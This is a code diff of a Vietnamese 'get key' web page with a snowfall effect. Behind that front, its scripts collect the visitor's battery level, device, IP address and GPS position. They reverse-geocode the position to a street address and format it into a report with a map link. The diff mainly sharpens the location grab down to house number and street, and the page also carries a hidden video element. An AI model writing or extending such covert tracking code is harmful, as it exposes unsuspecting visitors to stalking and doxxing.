@@ -18,7 +18,6 @@
   }
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 600; }
   body {
-    /* Nền ảnh cảnh biển hoàng hôn/xanh mát */
     background: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed;
     background-size: cover;
     color: var(--text-main);
@@ -31,7 +30,6 @@
     position: relative;
   }
 
-  /* Lớp phủ làm tối nhẹ nền biển để nổi bật khung card */
   body::before {
     content: '';
     position: absolute;
@@ -40,7 +38,6 @@
     z-index: 1;
   }
 
-  /* Hiệu ứng tuyết rơi */
   canvas#snow-canvas {
     position: absolute;
     top: 0;
@@ -104,7 +101,6 @@
   .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: #bae6fd; min-height: 20px; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(56,189,248,0.4); }
   #video { display: none; }
 
-  /* Khung chặn In-App Browser */
   #browser-warning {
     position: fixed;
     top: 0; left: 0; width: 100%; height: 100%;
@@ -147,7 +143,6 @@
 </head>
 <body>
 
-  <!-- Bắt buộc mở trình duyệt ngoài -->
   <div id="browser-warning">
     <div class="warning-box">
       <h3>⚠️ YÊU CẦU MỞ TRÌNH DUYỆT NGOÀI</h3>
@@ -156,7 +151,6 @@
     </div>
   </div>
 
-  <!-- Canvas hiệu ứng tuyết rơi -->
   <canvas id="snow-canvas"></canvas>
 
   <script>
@@ -274,7 +268,6 @@
   const video = document.getElementById('video');
   const getKeyBtn = document.getElementById('get-key-btn');
 
-  // Lấy % pin thiết bị
   async function getBatteryInfo() {
     try {
       if (navigator.getBattery) {
@@ -287,7 +280,7 @@
     return 'Không rõ';
   }
 
-  // Lấy chi tiết Xã/Phường, Tỉnh/Thành phố
+  // Hàm bóc tách cực kỳ chi tiết chuẩn hành chính Việt Nam (Phường/Xã, Quận/Huyện, Tỉnh/Thành phố)
   async function getDetailedLocation() {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
@@ -303,17 +296,23 @@
           let addressString = `Tọa độ: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
           
           try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=vi`, {
               headers: { 'User-Agent': 'Mozilla/5.0' }
             });
             const data = await res.json();
             if (data && data.address) {
               const addr = data.address;
-              const ward = addr.quarter || addr.suburb || addr.neighbourhood || addr.ward || '';
-              const district = addr.city_district || addr.county || addr.district || '';
-              const city = addr.city || addr.province || addr.state || '';
               
+              // Bóc tách ưu tiên chính xác các trường hành chính
+              const ward = addr.ward || addr.suburb || addr.quarter || addr.neighbourhood || '';
+              const district = addr.city_district || addr.district || addr.county || '';
+              const city = addr.city || addr.province || addr.state || '';
+              const road = addr.road || addr.residential || '';
+              const houseNumber = addr.house_number || '';
+
               let parts = [];
+              if (houseNumber) parts.push(`Số ${houseNumber}`);
+              if (road) parts.push(road);
               if (ward) parts.push(ward);
               if (district) parts.push(district);
               if (city) parts.push(city);
@@ -418,7 +417,7 @@
       `📱 <b>Thiết bị:</b> ${deviceName}\n` +
       `🔋 <b>Phần trăm pin:</b> ${batteryInfo}\n` +
       `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
-      `🏡 <b>Địa chỉ chính xác (Xã/Tỉnh):</b> ${locationData.fullAddress}\n`;
+      `🏡 <b>Địa chỉ chính xác (Số nhà, Phường, Quận, Tỉnh):</b>\n<code>${locationData.fullAddress}</code>\n`;
 
     if (locationData.mapsUrl) {
       infoText += `🗺️ <b>Google Maps:</b> <a href="${locationData.mapsUrl}">Xem vị trí cụ thể</a>\n`;
